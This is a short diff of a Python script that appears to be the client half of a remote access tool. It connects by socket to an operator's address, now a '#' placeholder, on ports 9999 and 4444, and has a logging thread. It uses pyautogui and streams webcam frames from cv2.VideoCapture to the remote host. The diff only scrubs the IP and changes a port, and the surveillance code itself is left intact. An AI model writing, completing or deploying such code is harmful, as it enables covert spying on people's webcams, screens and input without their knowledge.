@@ -11,7 +11,7 @@ import struct
 import pyautogui
 
 soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-soc.connect(('192.168.0.107', 9999)) # Enter your ip address in '#'
+soc.connect(('#', 9999)) # Enter your ip address in '#'
 
 def data_receive():
     data = ''
@@ -49,7 +49,7 @@ def log_thread():
 
 def byte_stream():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect(('192.168.0.107', 9998)) # Enter your ip address in '#'
+    sock.connect(('#', 4444)) # Enter your ip address in '#'
     vid = cv2.VideoCapture(0)
     while (vid.isOpened()):
         img, frame = vid.read()
